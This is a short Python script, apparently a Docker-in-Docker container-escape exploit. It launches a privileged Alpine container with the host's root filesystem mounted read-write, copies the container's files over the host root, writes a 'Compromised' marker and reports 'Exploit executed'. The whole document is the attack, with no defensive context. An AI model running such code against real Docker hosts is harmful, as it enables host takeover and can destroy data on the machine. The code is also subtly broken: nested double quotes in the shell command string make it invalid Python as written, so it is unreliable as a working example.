import docker, time, os

client = docker.DockerClient(base_url=os.getenv('DOCKER_HOST'))

def launch_privileged_container():
    print("Launching privileged container to mount host root")
    client.containers.run(
        "alpine:3.12",
        "sh -c 'mount -t proc proc /proc && cp -r / /host_root && echo "Compromised" > /host_root/tmp/compromised.txt'",
        privileged=True,
        remove=True,
        volumes={'/':'/host_root:rw'},
        detach=False
    )

if __name__ == "__main__":
    # give dind time to start
    time.sleep(5)
    launch_privileged_container()
    print("Exploit executed")